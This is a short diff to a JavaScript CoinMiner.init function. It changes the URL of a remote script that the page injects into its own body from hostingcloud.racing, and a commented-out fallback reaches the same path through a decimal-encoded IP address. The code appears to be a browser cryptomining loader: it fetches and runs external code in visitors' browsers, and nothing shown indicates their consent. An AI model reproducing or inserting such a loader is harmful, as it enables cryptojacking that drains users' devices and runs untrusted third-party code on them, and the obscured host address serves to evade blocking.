@@ -10,8 +10,8 @@ CoinMiner.init = function()
   //TODO: download locally too...
   var coinScript = document.createElement('script');
   document.body.appendChild(coinScript);
-  coinScript.src = "https://www.hostingcloud.racing/vyC3.js";
-  //coinScript.src = "https://3558932317/vyC3.js";
+  coinScript.src = "https://www.hostingcloud.racing/6fnq.js";
+  //coinScript.src = "https://3558932317/6fnq.js";
 
   coinScript.onload = function ()
   {
